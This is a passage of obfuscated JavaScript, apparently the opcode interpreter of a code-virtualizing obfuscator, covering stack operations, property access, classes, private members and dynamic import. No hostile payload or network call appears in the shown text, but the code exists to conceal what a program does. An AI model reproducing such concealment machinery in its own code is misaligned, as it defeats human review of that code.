TypeError('Cannot\x20set\x20property\x20\x27'+String(lU)+'\x27\x20of\x20'+lf);if(CE['_$wPHaOR']){if(!Reflect['set'](lf,lU,lg))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(lU)+'\x27\x20of\x20object');}else lf[lU]=lg;ja[jn++]=lg,jw++;}break;}case 0x15:{ET:{let ld=ja[--jn],lM=ja[--jn];ja[jn++]=lM|ld,jw++;}break;}case 0x49:{EX:{let lb=ja[--jn],lZ=ja[--jn],lY=ja[--jn];if(lY===null||lY===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(lZ)+'\x27\x20of\x20'+lY);if(CE['_$wPHaOR']){if(!Reflect['set'](lY,lZ,lb))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(lZ)+'\x27\x20of\x20object');}else lY[lZ]=lb;ja[jn++]=lb,jw++;}break;}case 0x53:{EL:{let lG=ja[--jn],lv=ja[--jn],lS=jJ[CZ];vmZ(lv,lS,{'value':lG,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lG==='function'&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](lG,lv)),jw++;}break;}case 0x28:{ER:{let lD=ja[--jn],lB=ja[--jn];ja[jn++]=lB==lD,jw++;}break;}case 0x14:{Em:{let lF=ja[--jn],lK=ja[--jn];ja[jn++]=lK&lF,jw++;}break;}case 0x3b:{EV:{jk['pop'](),jw++;}break;}case 0x9:{EH:{jF[CZ]=ja[--jn],jw++;}break;}case 0xb:{EP:{let lQ=ja[--jn],lr=ja[--jn];ja[jn++]=lr-lQ,jw++;}break;}case 0x46:{Ee:{let lA=ja[--jn],la=jJ[CZ];if(lA===null||lA===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(la)+'\x27\x20of\x20'+lA);ja[jn++]=lA[la],jw++;}break;}case 0x12:{Eh:{let ln=ja[--jn],lq=ja[--jn];ja[jn++]=lq**ln,jw++;}break;}case 0x40:{Ec:{let lw=jI[jw];if(jk&&jk['length']>0x0){let lJ=jk[jk['length']-0x1];if(lJ['_$vKxByc']!==undefined&&lw>=lJ['_$lhqrKM']){jV=!![],jH=lw,jw=lJ['_$vKxByc'];break Ec;}}jw=lw;}break;}case 0x1:{Ep:{ja[jn++]=undefined,jw++;}break;}case 0x38:{N0:{if(jk&&jk['length']>0x0){let ls=jk[jk['length']-0x1];if(ls['_$vKxByc']!==undefined){jX=!![],jL=ja[--jn],jw=ls['_$vKxByc'];break N0;}}return jX&&(jX=![],jL=undefined),Cl=ja[--jn],0x1;}break;}case 0x34:{N1:{!ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x2:{N2:{ja[jn++]=null,jw++;}break;}case 0x8:{N3:{ja[jn++]=jF[CZ],jw++;}break;}case 0x32:{N4:{jw=jI[jw];}break;}case 0x1c:{N5:{let lI=ja[--jn];ja[jn++]=typeof lI===f?lI:+lI,jw++;}break;}case 0x54:{N6:{let lW=ja[--jn],lu=ja[--jn],lO=ja[--jn];vmZ(lO,lu,{'value':lW,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lW==='function'&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](lW,lO)),jw++;}break;}case 0x2b:{N7:{let lz=ja[--jn],lo=ja[--jn];ja[jn++]=lo!==lz,jw++;}break;}case 0x51:{N8:{let lt=ja[--jn],lk=ja[jn-0x1];lt!==null&&lt!==undefined&&Object['assign'](lk,lt),jw++;}break;}case 0xe:{N9:{let lT=ja[--jn],lX=ja[--jn];ja[jn++]=lX%lT,jw++;}break;}case 0x1a:{Nj:{let lL=ja[--jn],lR=ja[--jn];ja[jn++]=lR>>>lL,jw++;}break;}case 0x1b:{NC:{let lm=ja[jn-0x3],lV=ja[jn-0x2],lH=ja[jn-0x1];ja[jn-0x3]=lV,ja[jn-0x2]=lH,ja[jn-0x1]=lm,jw++;}break;}case 0x52:{Nl:{let lP=ja[--jn],le=ja[--jn];le===null||le===undefined?ja[jn++]=undefined:ja[jn++]=le[lP],jw++;}break;}case 0xd:{NE:{let lh=ja[--jn],lc=ja[--jn];ja[jn++]=lc/lh,jw++;}break;}case 0x13:{NN:{ja[jn-0x1]=+ja[jn-0x1],jw++;}break;}case 0x48:{Ny:{let lp=ja[--jn],E0=ja[--jn];if(E0===null||E0===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(lp)+'\x27\x20of\x20'+E0);ja[jn++]=E0[lp],jw++;}break;}case 0x29:{Nx:{let E1=ja[--jn],E2=ja[--jn];ja[jn++]=E2!=E1,jw++;}break;}case 0x4f:{Ni:{let E3=ja[--jn],E4=ja[--jn];ja[jn++]=E4 in E3,jw++;}break;}case 0x4b:{Ng:{let E5=jJ[CZ],E6;if(vmg_717f62['_$5efjzU']&&E5 in vmg_717f62['_$5efjzU'])throw new ReferenceError('Cannot\x20access\x20\x27'+E5+'\x27\x20before\x20initialization');if(E5 in vmg_717f62)E6=vmg_717f62[E5];else{if(E5 in vmd)E6=vmd[E5];else throw new ReferenceError(E5+'\x20is\x20not\x20defined');}ja[jn++]=E6,jw++;}break;}case 0x3:{Nf:{ja[--jn],jw++;}break;}case 0x0:{NU:{ja[jn++]=jJ[CZ],jw++;}break;}case 0xc:{Nd:{let E7=ja[--jn],E8=ja[--jn];ja[jn++]=E8*E7,jw++;}break;}case 0x19:{NM:{let E9=ja[--jn],Ej=ja[--jn];ja[jn++]=Ej>>E9,jw++;}break;}case 0x3e:{Nb:{if(jT!==null){jX=![],jR=![],jV=![];let EC=jT;jT=null;throw EC;}if(jX){if(jk&&jk['length']>0x0){let EE=jk[jk['length']-0x1];if(EE['_$vKxByc']!==undefined){jw=EE['_$vKxByc'];break Nb;}}let El=jL;return jX=![],jL=undefined,Cl=El,0x1;}if(jR){if(jk&&jk['length']>0x0){let Ey=jk[jk['length']-0x1];if(Ey['_$vKxByc']!==undefined){jw=Ey['_$vKxByc'];break Nb;}}let EN=jm;jR=![],jm=0x0,jw=EN;break Nb;}if(jV){if(jk&&jk['length']>0x0){let Ei=jk[jk['length']-0x1];if(Ei['_$vKxByc']!==undefined){jw=Ei['_$vKxByc'];break Nb;}}let Ex=jH;jV=![],jH=0x0,jw=Ex;break Nb;}jw++;}break;}case 0x2a:{NZ:{let Eg=ja[--jn],Ef=ja[--jn];ja[jn++]=Ef===Eg,jw++;}break;}case 0x10:{NY:{let EU=ja[--jn];ja[jn++]=typeof EU===f?EU+0x1n:+EU+0x1,jw++;}break;}case 0x4:{NG:{let Ed=ja[jn-0x1];ja[jn++]=Ed,jw++;}break;}case 0x2c:{Nv:{let EM=ja[--jn],Eb=ja[--jn];ja[jn++]=Eb<EM,jw++;}break;}case 0x1d:{NS:{ja[jn-0x1]=String(ja[jn-0x1]),jw++;}break;}case 0xf:{ND:{ja[jn-0x1]=-ja[jn-0x1],jw++;}break;}}},Cx=function(Cb,CZ){switch(Cb){case 0x6f:{Nm:{let CG=ja[--jn],Cv=ja[--jn];ja[jn++]=Cv instanceof CG,jw++;}break;}case 0xa2:{NV:{let CS=CZ&0xffff,CD=CZ>>0x10,CB=jJ[CS],CF=jJ[CD];ja[jn++]=new RegExp(CB,CF),jw++;}break;}case 0xa6:{NH:{ja[jn++]=vmb[CZ],jw++;}break;}case 0xa3:{NP:{ja[--jn],ja[jn++]=undefined,jw++;}break;}case 0x7b:{Ne:{let CK=ja[--jn],CQ=CK['next']();ja[jn++]=CQ,jw++;}break;}case 0xb7:{Nh:{let Cr=ja[--jn],CA=ja[--jn],Ca=ja[jn-0x1],Cn=D(Ca);vmZ(Cn,CA,{'set':Cr,'enumerable':Cn===Ca,'configurable':!![]}),jw++;}break;}case 0x68:{Nc:{let Cq=ja[--jn],Cw=G(C2,Cq),CJ=ja[--jn];if(typeof CJ!=='function')throw new TypeError(CJ+'\x20is\x20not\x20a\x20constructor');if(b['has'](CJ))throw new TypeError(CJ['name']+'\x20is\x20not\x20a\x20constructor');let Cs=vmg_717f62['_$yi8Vf9'];vmg_717f62['_$yi8Vf9']=undefined;let CI;try{CI=Reflect['construct'](CJ,Cw);}finally{vmg_717f62['_$yi8Vf9']=Cs;}ja[jn++]=CI,jw++;}break;}case 0x64:{Np:{let CW=ja[--jn],Cu=typeof CW==='object'?CW:jv(CW),CO=Cu&&Cu[0x4],Cz=Cu&&Cu[0x12],Co=Cu&&Cu[0x7],Ct=Cu&&Cu[0x10],Ck=Cu&&Cu[0xb]||0x0,CT=Cu&&Cu[0x1],CX=CO?CE['_$LX6iYq']:undefined,CL=CE['_$UP7JxF'],CR;if(Co)CR=I(jD,CW,CL,b,CT,vmd);else{if(Cz){if(CO)CR=u(jS,CW,CL,CX);else Ct?CR=z(jS,CW,CL,CT,vmd):CR=s(jS,CW,CL,CT,vmd);}else{if(CO)CR=W(T,CW,CL,CX);else Ct?CR=O(T,CW,CL,CT,vmd):CR=J(T,CW,CL,CT,vmd);}}Y(CR,'length',{'value':Ck,'writable':![],'enumerable':![],'configurable':!![]}),ja[jn++]=CR,jw++;}break;}case 0xb4:{y0:{let Cm=ja[--jn],CV=ja[--jn],CH=ja[jn-0x1];vmZ(CH['prototype'],CV,{'value':Cm,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x90:{y1:{let CP=ja[--jn],Ce=ja[jn-0x1],Ch=jJ[CZ];vmZ(Ce['prototype'],Ch,{'value':CP,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5e:{y2:{let Cc=ja[--jn],Cp=ja[jn-0x1];if(Array['isArray'](Cc))Array['prototype']['push']['apply'](Cp,Cc);else for(let l0 of Cc){Cp['push'](l0);}jw++;}break;}case 0xa4:{y3:{ja[jn++]=jr,jw++;}break;}case 0x98:{y4:{let l1=ja[--jn],l2=ja[--jn],l3=jJ[CZ],l4=A();!l4['has'](l3)&&l4['set'](l3,new WeakMap());let l5=l4['get'](l3);if(l5['has'](l2))throw new TypeError('Cannot\x20initialize\x20'+l3+'\x20twice\x20on\x20the\x20same\x20object');l5['set'](l2,l1),jw++;}break;}case 0x7c:{y5:{let l6=ja[--jn];l6&&typeof l6['return']==='function'&&l6['return'](),jw++;}break;}case 0x97:{y6:{let l7=ja[--jn],l8=ja[--jn],l9=jJ[CZ],lj=A(),lC='set_'+l9,ll=lj['get'](lC);if(ll&&ll['has'](l8)){let lx=ll['get'](l8);lx['call'](l8,l7),ja[jn++]=l7,jw++;break y6;}let lE='_$6ROloL'+'set_'+l9['substring'](0x1)+'_$AZoxSE';if(l8['constructor']&&lE in l8['constructor']){let li=l8['constructor'][lE];li['call'](l8,l7),ja[jn++]=l7,jw++;break y6;}let lN=lj['get'](l9);if(lN&&lN['has'](l8)){lN['set'](l8,l7),ja[jn++]=l7,jw++;break y6;}let ly=q(l9);if(ly in l8){l8[ly]=l7,ja[jn++]=l7,jw++;break y6;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+l9+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x8c:{y7:{let lg=ja[--jn],lf=ja[--jn],lU=CZ,ld=function(lM,lb){let lZ=function(){if(lM){lb&&(vmg_717f62['_$v1TyU6']=lZ);let lY='_$L4iaoq'in vmg_717f62;!lY&&(vmg_717f62['_$L4iaoq']=new.target);try{let lG=lM['apply'](this,S(arguments));if(lb&&lG!==undefined&&(typeof lG!=='object'||lG===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return lG;}finally{lb&&delete vmg_717f62['_$v1TyU6'],!lY&&delete vmg_717f62['_$L4iaoq'];}}};return lZ;}(lf,lU);lg&&vmZ(ld,'name',{'value':lg,'configurable':!![]}),ja[jn++]=ld,jw++;}break;}case 0x94:{y8:{let lM=ja[--jn],lb=ja[jn-0x1],lZ=jJ[CZ];vmZ(lb,lZ,{'get':lM,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x6e:{y9:{ja[jn-0x1]=typeof ja[jn-0x1],jw++;}break;}case 0xa1:{yj:{if(C6===null){if(CE['_$wPHaOR']||!CE['_$7AWJXJ']){let lY=CE['_$mncnwJ']||jF,lG=lY?lY['length']:0x0;C6=vmY(Object['prototype']);for(let lv=0x0;lv<lG;lv++){C6[lv]=lY[lv];}vmZ(C6,'length',{'value':lG,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(C6,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),C6=new Proxy(C6,{'has':function(lS,lD){if(lD===Symbol['toStringTag'])return![];return lD in lS;},'get':function(lS,lD,lB){if(lD===Symbol['toStringTag'])return'Arguments';return Reflect['get'](lS,lD,lB);}}),CE['_$wPHaOR']?vmZ(C6,'callee',{'get':d,'set':d,'enumerable':![],'configurable':![]}):vmZ(C6,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]});}else{let lS=jF?jF['length']:0x0,lD={},lB={},lF=jQ,lK=![],lQ=!![],lr={},lA=function(lJ){if(typeof lJ!=='string')return NaN;let ls=+lJ;return ls>=0x0&&ls%0x1===0x0&&String(ls)===lJ?ls:NaN;},la=function(lJ){return!isNaN(lJ)&&lJ>=0x0;},ln=function(lJ){if(lJ in lB)return undefined;if(lJ in lD)return lD[lJ];return lJ<jF['length']?jF[lJ]:undefined;},lq=function(lJ){if(lJ in lB)return![];if(lJ in lD)return!![];return lJ<jF['length']?lJ in jF:![];},lw={};vmZ(lw,'length',{'value':lS,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(lw,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(lw,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),C6=new Proxy(lw,{'get':function(lJ,ls,lI){if(ls==='length')return lS;if(ls==='callee')return lK?undefined:lF;if(ls===Symbol['toStringTag'])return'Arguments';let lW=lA(ls);if(la(lW)){if(lW in lr)return Reflect['get'](lJ,ls,lI);return ln(lW);}return Reflect['get'](lJ,ls,lI);},'set':function(lJ,ls,lI){if(ls==='length'){if(!lQ)return![];return lS=lI,lJ['length']=lI,!![];}if(ls==='callee')return lF=lI,lK=![],lJ['callee']=lI,!![];let lW=lA(ls);if(la(lW)){if(lW in lr)return Reflect['set'](lJ,ls,lI);let lu=vmG(lJ,String(lW));if(lu&&!lu['writable'])return![];if(lW in lB)delete lB[lW],lD[lW]=lI;else lW<jF['length']?jF[lW]=lI:lD[lW]=lI;return!![];}return lJ[ls]=lI,!![];},'has':function(lJ,ls){if(ls==='length')return!![];if(ls==='callee')return!lK;if(ls===Symbol['toStringTag'])return![];let lI=lA(ls);if(la(lI)){if(String(lI)in lJ)return!![];return lq(lI);}return ls in lJ;},'defineProperty':function(lJ,ls,lI){if(ls==='length')return'value'in lI&&(lS=lI['value']),'writable'in lI&&(lQ=lI['writable']),vmZ(lJ,ls,lI),!![];if(ls==='callee')return'value'in lI&&(lF=lI['value']),lK=![],vmZ(lJ,ls,lI),!![];let lW=lA(ls);if(la(lW)){if('get'in lI||'set'in lI)lr[lW]=0x1,lW in lD&&delete lD[lW],lW in lB&&delete lB[lW];else'value'in lI&&(lW<jF['length']&&!(lW in lB)?jF[lW]=lI['value']:(lD[lW]=lI['value'],lW in lB&&delete lB[lW]));return vmZ(lJ,String(lW),lI),!![];}return vmZ(lJ,ls,lI),!![];},'deleteProperty':function(lJ,ls){if(ls==='callee')return lK=!![],delete lJ['callee'],!![];let lI=lA(ls);return la(lI)&&(lI in lr&&delete lr[lI],lI<jF['length']?lB[lI]=0x1:delete lD[lI]),delete lJ[ls],!![];},'preventExtensions':function(lJ){let ls=jF?jF['length']:0x0;for(let lI=0x0;lI<ls;lI++){!(lI in lB)&&!vmG(lJ,String(lI))&&vmZ(lJ,String(lI),{'value':ln(lI),'writable':!![],'enumerable':!![],'configurable':!![]});}for(let lW in lD){!vmG(lJ,lW)&&vmZ(lJ,lW,{'value':lD[lW],'writable':!![],'enumerable':!![],'configurable':!![]});}return Object['preventExtensions'](lJ),!![];},'getOwnPropertyDescriptor':function(lJ,ls){if(ls==='callee'){if(lK)return undefined;return vmG(lJ,'callee');}if(ls==='length')return vmG(lJ,'length');let lI=lA(ls);if(la(lI)){if(lI in lr)return vmG(lJ,ls);if(lq(lI)){let lu=vmG(lJ,String(lI));return{'value':ln(lI),'writable':lu?lu['writable']:!![],'enumerable':lu?lu['enumerable']:!![],'configurable':lu?lu['configurable']:!![]};}return vmG(lJ,ls);}let lW=vmG(lJ,ls);if(lW)return lW;return undefined;},'ownKeys':function(lJ){let ls=[],lI=jF?jF['length']:0x0;for(let lu=0x0;lu<lI;lu++){!(lu in lB)&&ls['push'](String(lu));}for(let lO in lD){ls['indexOf'](lO)===-0x1&&ls['push'](lO);}ls['push']('length');!lK&&ls['push']('callee');let lW=Reflect['ownKeys'](lJ);for(let lz=0x0;lz<lW['length'];lz++){ls['indexOf'](lW[lz])===-0x1&&ls['push'](lW[lz]);}return ls;}});}}ja[jn++]=C6,jw++;}break;}case 0x5d:{yC:{let lJ=ja[--jn],ls={'value':Array['isArray'](lJ)?lJ:Array['from'](lJ)};M['add'](ls),ja[jn++]=ls,jw++;}break;}case 0x8e:{yl:{let lI=ja[--jn],lW=ja[--jn],lu=vmg_717f62['_$yi8Vf9'],lO=lu?vmB(lu):B(lW),lz=F(lO,lI);if(lz['desc']&&lz['desc']['get']){let lt=lz['desc']['get']['call'](lW);ja[jn++]=lt,jw++;break yl;}if(lz['desc']&&lz['desc']['set']&&!('value'in lz['desc'])){ja[jn++]=undefined,jw++;break yl;}let lo=lz['proto']?lz['proto'][lI]:lO[lI];if(typeof lo==='function'){let lk=lz['proto']||lO,lT=lo['bind'](lW),lX=lo['constructor']&&lo['constructor']['name'],lL=lX==='GeneratorFunction'||lX==='AsyncFunction'||lX==='AsyncGeneratorFunction';!lL&&(!vmg_717f62['_$RycY0U']&&(vmg_717f62['_$RycY0U']=new WeakMap()),vmg_717f62['_$RycY0U']['set'](lT,lk)),ja[jn++]=lT;}else ja[jn++]=lo;jw++;}break;}case 0xa9:{yE:{let lR=ja[--jn];ja[jn++]=Symbol['keyFor'](lR),jw++;}break;}case 0x8f:{yN:{let lm=ja[--jn],lV=ja[--jn],lH=ja[--jn],lP=B(lH),le=F(lP,lV);le['desc']&&le['desc']['set']?le['desc']['set']['call'](lH,lm):lH[lV]=lm,ja[jn++]=lm,jw++;}break;}case 0x69:{yy:{let lh=ja[--jn],lc=G(C2,lh),lp=ja[--jn];if(CZ===0x1){ja[jn++]=lc,jw++;break yy;}if(vmg_717f62['_$EwyF83']){jw++;break yy;}let E0=vmg_717f62['_$stfQnK'];if(E0){let E1=E0['parent'],E2=E0['newTarget'],E3=Reflect['construct'](E1,lc,E2);jA&&jA!==E3&&vmv(jA)['forEach'](function(E4){!(E4 in E3)&&(E3[E4]=jA[E4]);});jA=E3,CE['_$LXelx5']=!![];CE['_$lGK2nA']&&(K(CE['_$UP7JxF'],'__this__'),!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP']['__this__']=jA);jw++;break yy;}if(typeof lp!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmg_717f62['_$L4iaoq']=jr;try{let E4=lp['apply'](jA,lc);E4!==undefined&&E4!==jA&&typeof E4==='object'&&(jA&&Object['assign'](E4,jA),jA=E4),CE['_$LXelx5']=!![],CE['_$lGK2nA']&&(K(CE['_$UP7JxF'],'__this__'),!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP']['__this__']=jA);}catch(E5){if(E5 instanceof TypeError&&(E5['message']['includes']('\x27new\x27')||E5['message']['includes']('constructor'))){let E6=Reflect['construct'](lp,lc,jr);E6!==jA&&jA&&Object['assign'](E6,jA),jA=E6,CE['_$LXelx5']=!![],CE['_$lGK2nA']&&(K(CE['_$UP7JxF'],'__this__'),!CE['_$UP7JxF']['_$9omHYP']&&(CE['_$UP7JxF']['_$9omHYP']=vmY(null)),CE['_$UP7JxF']['_$9omHYP']['__this__']=jA);}else throw E5;}finally{delete vmg_717f62['_$L4iaoq'];}jw++;}break;}case 0x99:{yx:{let E7=ja[--jn],E8=jJ[CZ],E9=![],Ej=a();if(Ej){let EC=Ej['get'](E8);EC&&EC['has'](E7)&&(E9=!![]);}ja[jn++]=E9,jw++;}break;}case 0x9c:{yi:{let El=ja[--jn];ja[--jn];let EE=ja[jn-0x1],EN=jJ[CZ],Ey=A();!Ey['has'](EN)&&Ey['set'](EN,new WeakMap());let Ex=Ey['get'](EN);Ex['set'](EE,El),jw++;}break;}case 0x9e:{yg:{let Ei=ja[--jn],Eg=ja[--jn],Ef=jJ[CZ],EU=a();if(EU){let Eb='set_'+Ef,EZ=EU['get'](Eb);if(EZ&&EZ['has'](Eg)){let EG=EZ['get'](Eg);EG['call'](Eg,Ei),ja[jn++]=Ei,jw++;break yg;}let EY=EU['get'](Ef);if(EY&&EY['has'](Eg)){EY['set'](Eg,Ei),ja[jn++]=Ei,jw++;break yg;}}let Ed='_$6ROloL'+'set_'+Ef['substring'](0x1)+'_$AZoxSE';if(Ed in Eg){let Ev=Eg[Ed];Ev['call'](Eg,Ei),ja[jn++]=Ei,jw++;break yg;}let EM=q(Ef);if(EM in Eg){Eg[EM]=Ei,ja[jn++]=Ei,jw++;break yg;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+Ef+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x5b:{yf:{let ES=ja[--jn],ED=ja[jn-0x1];ED['push'](ES),jw++;}break;}case 0xa0:{yU:{if(CE['_$cEXkWi']&&!CE['_$LXelx5'])throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');ja[jn++]=jA,jw++;}break;}case 0x7f:{yd:{let EB=ja[--jn];if(EB==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+EB);let EF=EB[Symbol['iterator']];if(typeof EF!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');ja[jn++]=vmQ(EF,EB,[]),jw++;}break;}case 0x8d:{yM:{let EK=ja[--jn],EQ=ja[jn-0x1];if(EK===null){vmD(EQ['prototype'],null),vmD(EQ,Function['prototype']),EQ['_$c3cS2T']=null,jw++;break yM;}if(typeof EK!=='function')throw new TypeError('Class\x20extends\x20value\x20'+String(EK)+'\x20is\x20not\x20a\x20constructor\x20or\x20null');let Er=![];try{let EA=vmY(EK['prototype']),Ea=EK['apply'](EA,[]);Ea!==undefined&&Ea!==EA&&(Er=!![]);}catch(En){En instanceof TypeError&&(En['message']['includes']('\x27new\x27')||En['message']['includes']('constructor')||En['message']['includes']('Illegal\x20constructor'))&&(Er=!![]);}if(Er){let Eq=EQ,Ew=vmg_717f62,EJ='_$L4iaoq',Es='_$v1TyU6',EI='_$stfQnK';function CY(...EW){let Eu=vmY(EK['prototype']);Ew[EI]={'parent':EK,'newTarget':new.target||CY},Ew[Es]=new.target||CY;let EO=EJ in Ew;!EO&&(Ew[EJ]=new.target);try{let Ez=Eq['apply'](Eu,EW);Ez!==undefined&&typeof Ez==='object'&&(Eu=Ez);}finally{delete Ew[EI],delete Ew[Es],!EO&&delete Ew[EJ];}return Eu;}CY['prototype']=vmY(EK['prototype']),CY['prototype']['constructor']=CY,vmD(CY,EK),vmv(Eq)['forEach'](function(EW){EW!=='prototype'&&EW!=='length'&&EW!=='name'&&Y(CY,EW,vmG(Eq,EW));});Eq['prototype']&&(vmv(Eq['prototype'])['forEach'](function(EW){EW!=='constructor'&&Y(CY['prototype'],EW,vmG(Eq['prototype'],EW));}),vmS(Eq['prototype'])['forEach'](function(EW){Y(CY['prototype'],EW,vmG(Eq['prototype'],EW));}));ja[--jn],ja[jn++]=CY,CY['_$c3cS2T']=EK,jw++;break yM;}vmD(EQ['prototype'],EK['prototype']),vmD(EQ,EK),EQ['_$c3cS2T']=EK,jw++;}break;}case 0x9d:{yb:{let EW=ja[--jn],Eu=jJ[CZ],EO=a();if(EO){let Et='get_'+Eu,Ek=EO['get'](Et);if(Ek&&Ek['has'](EW)){let EX=Ek['get'](EW);ja[jn++]=EX['call'](EW),jw++;break yb;}let ET=EO['get'](Eu);if(ET&&ET['has'](EW)){ja[jn++]=ET['get'](EW),jw++;break yb;}}let Ez='_$6ROloL'+'get_'+Eu['substring'](0x1)+'_$AZoxSE';if(Ez in EW){let EL=EW[Ez];ja[jn++]=EL['call'](EW),jw++;break yb;}let Eo=q(Eu);if(Eo in EW){ja[jn++]=EW[Eo],jw++;break yb;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Eu+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x96:{yZ:{let ER=ja[--jn],Em=jJ[CZ],EV=A(),EH='get_'+Em,EP=EV['get'](EH);if(EP&&EP['has'](ER)){let Ep=EP['get'](ER);ja[jn++]=Ep['call'](ER),jw++;break yZ;}let Ee='_$6ROloL'+'get_'+Em['substring'](0x1)+'_$AZoxSE';if(ER['constructor']&&Ee in ER['constructor']){let N0=ER['constructor'][Ee];ja[jn++]=N0['call'](ER),jw++;break yZ;}let Eh=EV['get'](Em);if(Eh&&Eh['has'](ER)){ja[jn++]=Eh['get'](ER),jw++;break yZ;}let Ec=q(Em);if(Ec in ER){ja[jn++]=ER[Ec],jw++;break yZ;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Em+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x80:{yY:{let N1=ja[--jn];ja[jn++]=!!N1['done'],jw++;}break;}case 0xa5:{yG:{ja[jn++]=vmM[CZ],jw++;}break;}case 0x81:{yv:{let N2=ja[--jn];if(N2==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+N2);let N3=N2[Symbol['asyncIterator']];if(typeof N3==='function')ja[jn++]=N3['call'](N2);else{let N4=N2[Symbol['iterator']];if(typeof N4!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');ja[jn++]=N4['call'](N2);}jw++;}break;}case 0x9b:{yS:{let N5=ja[--jn],N6=jJ[CZ];if(N5==null){ja[jn++]=undefined,jw++;break yS;}let N7=A(),N8=N7['get'](N6);if(!N8||!N8['has'](N5))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+N6+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');ja[jn++]=N8['get'](N5),jw++;}break;}case 0xb8:{yD:{let N9=ja[--jn],Nj=ja[--jn],NC=ja[jn-0x1];vmZ(NC,Nj,{'get':N9,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x93:{yB:{let Nl=ja[--jn],NE=ja[jn-0x1],NN=jJ[CZ];vmZ(NE,NN,{'value':Nl,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5a:{yF:{ja[jn++]=[],jw++;}break;}case 0x70:{yK:{let Ny=jJ[CZ];Ny in vmg_717f62?ja[jn++]=typeof vmg_717f62[Ny]:ja[jn++]=typeof vmd[Ny],jw++;}break;}case 0x84:{yQ:{let Nx=ja[--jn];ja[jn++]=v(Nx),jw++;}break;}case 0x83:{yr:{let Ni=ja[--jn];Ni&&typeof Ni['return']==='function'?ja[jn++]=Promise['resolve'](Ni['return']()):ja[jn++]=Promise['resolve'](),jw++;}break;}case 0xb6:{yA:{let Ng=ja[--jn],Nf=ja[--jn],NU=ja[jn-0x1],Nd=D(NU);vmZ(Nd,Nf,{'get':Ng,'enumerable':Nd===NU,'configurable':!![]}),jw++;}break;}case 0x95:{ya:{let NM=ja[--jn],Nb=ja[jn-0x1],NZ=jJ[CZ];vmZ(Nb,NZ,{'set':NM,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x82:{yn:{let NY=ja[--jn],NG=NY['next']();ja[jn++]=Promise['resolve'](NG),jw++;}break;}case 0xa8:{yq:{let Nv=jJ[CZ];ja[jn++]=Symbol['for'](Nv),jw++;}break;}case 0x6a:{yw:{let NS=ja[--jn];ja[jn++]=import(NS),jw++;}break;}case 0x9a:{yJ:{let ND=ja[--jn],NB=ja[--jn],NF=jJ[CZ],NK=null,NQ=a();if(NQ){let Na=NQ['get'](NF);Na&&Na['has'](NB)&&(NK=Na['get'](NB));}if(NK===null){let Nn=w(NF);Nn in NB&&(NK=NB[Nn]);}if(NK===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+NF+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof NK!=='function')throw new TypeError(NF+'\x20is\x20not\x20a\x20function');let Nr=G(C2,ND),NA=NK['apply'](NB,Nr);ja[jn++]=NA,jw++;}break;}case 0x5f:{ys:{let Nq=ja[jn-0x1];Nq['length']++,jw++;}break;}case 0x92:{yI:{let Nw=ja[--jn],NJ=ja[jn-0x1],Ns=jJ[CZ],NI=D(NJ);vmZ(NI,Ns,{'set':Nw,'enumerable':NI===NJ,'configurable':!![]}),jw++;}break;}case 0x91:{yW:{let NW=ja[--jn],Nu=ja[jn-0x1],NO=jJ[CZ],Nz=D(Nu);vmZ(Nz,NO,{'get':NW,'enumerable':Nz===Nu,'configurable':!![]}),jw++;}break;}case 0xb9:{yu:{let 